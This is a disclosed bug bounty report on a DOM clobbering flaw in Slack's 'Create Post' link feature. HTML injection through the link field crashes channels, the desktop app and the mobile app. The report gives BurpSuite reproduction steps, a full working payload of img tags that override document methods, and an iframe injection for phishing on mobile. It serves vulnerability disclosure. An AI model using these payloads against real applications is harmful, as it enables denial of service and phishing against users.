# Denial of Service via Hyperlinks in Posts

## Report Details
- **Report ID**: 1077136
- **URL**: https://hackerone.com/reports/1077136
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2021-01-12T16:56:29.211Z
- **Disclosed**: 2021-10-03T13:52:10.667Z

## Reporter
- **Username**: joaovitormaia
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: slack

## Vulnerability Information
###Summary
Via html injection its possible to override all document functions, causing the application to crash because its using the element as a function.

###Brief explanation of how its possible override document functions with html injection:
In some html elements, the name attribute becomes a property on  the document object, so if ```<img src=x name="xyz">``` is inserted on the DOM, its created a reference for this element: ```document.xyz```. For some reason, if the name is the name of a function that already exists on the document object, its get overrided, so if ```<img src=x name="write">``` its inserted on the page, ```document.write````becomes the reference of the html element.

###PoC
Required tools:
1. BurpSuite

Repro Steps: 
 Click on the ```Create Post``` feature

{F1154882}

 Add any title and any content

 Select the content and click on the create link feature

{F1154880}

 Add any link:

{F1154891}

 Click on ```Ok``` and  intecept the request on burpsuite

 Replace the ```link``` property to the following one(as screenshot shows):

```
https://xyz.com\"><img src=x name='constructor' /><img src=x name='adoptNode' /><img src=x name='append' /><img src=x name='captureEvents' /><img src=x name='caretRangeFromPoint' /><img src=x name='clear' /><img src=x name='close' /><img src=x name='createAttribute' /><img src=x name='createAttributeNS' /><img src=x name='createCDATASection' /><img src=x name='createComment' /><img src=x name='createDocumentFragment' /><img src=x name='createElement' /><img src=x name='createElementNS' /><img src=x name='createEvent' /><img src=x name='createExpression' /><img src=x name='createNSResolver' /><img src=x name='createNodeIterator' /><img src=x name='createProcessingInstruction' /><img src=x name='createRange' /><img src=x name='createTextNode' /><img src=x name='createTreeWalker' /><img src=x name='elementFromPoint' /><img src=x name='elementsFromPoint' /><img src=x name='evaluate' /><img src=x name='execCommand' /><img src=x name='exitFullscreen' /><img src=x name='exitPointerLock' /><img src=x name='getElementById' /><img src=x name='getElementsByClassName' /><img src=x name='getElementsByName' /><img src=x name='getElementsByTagName' /><img src=x name='getElementsByTagNameNS' /><img src=x name='getSelection' /><img src=x name='hasFocus' /><img src=x name='importNode' /><img src=x name='open' /><img src=x name='prepend' /><img src=x name='queryCommandEnabled' /><img src=x name='queryCommandIndeterm' /><img src=x name='queryCommandState' /><img src=x name='queryCommandSupported' /><img src=x name='queryCommandValue' /><img src=x name='querySelector' /><img src=x name='querySelectorAll' /><img src=x name='releaseEvents' /><img src=x name='webkitCancelFullScreen' /><img src=x name='webkitExitFullscreen' /><img src=x name='write' /><img src=x name='writeln' /><img src=x name='getAnimations' /><img src=x name='exitPictureInPicture' /><img src=x name='replaceChildren' /><img src=x name='appendChild' /><img src=x name='cloneNode' /><img src=x name='compareDocumentPosition' /><img src=x name='contains' /><img src=x name='getRootNode' /><img src=x name='hasChildNodes' /><img src=x name='insertBefore' /><img src=x name='isDefaultNamespace' /><img src=x name='isEqualNode' /><img src=x name='isSameNode' /><img src=x name='lookupNamespaceURI' /><img src=x name='lookupPrefix' /><img src=x name='normalize' /><img src=x name='removeChild' /><img src=x name='replaceChild' /><img src=x name='addEventListener' /><img src=x name='dispatchEvent' /><img src=x name='removeEventListener' /><img src=x name='__defineGetter__' /><img src=x name='__defineSetter__' /><img src=x name='hasOwnProperty' /><img src=x name='__lookupGetter__' /><img src=x name='__lookupSetter__' /><img src=x name='isPrototypeOf' /><img src=x name='propertyIsEnumerable' /><img src=x name='toString' /><img src=x name='valueOf' /><img src=x name='toLocaleString' />
```

{F1154883}

Share the post on any channel:

{F1154884}

After that the application crash when you access the channel ou direct message:

{F1154881}

Its also pretty hard to navigate to another channel, so in many cases the slack application its all crashed(ex: when the user opened the message details and then the attacker change the content to the above payload)
The only way to stop the channel from crashing its deleting on editing the post.
###Observations
The desktop application its also affected
On the mobile application its possible to inject iframes so a phishing attack its also possible using this payload ```https://xyz.com\"><iframe>```:

{F1154910}

*I'm showing you guys the mobile impact as well because its probably the same entry point, so resolving one issue automatically solve the other

###Useful links
https://medium.com/@terjanq/dom-clobbering-techniques-8443547ebe94
https://portswigger.net/web-security/dom-based/dom-clobbering

## Impact

Its possible to disable a channel or a message conversation, and in some scenarios its possible to crash the entire slack application.

## Attachments
- createlinkfunction.PNG
- crash.PNG
- postprint.PNG
- request.PNG
- share.PNG
- link.PNG
- de5f8eb6-333c-4408-bd74-c83fd0626332.jpg
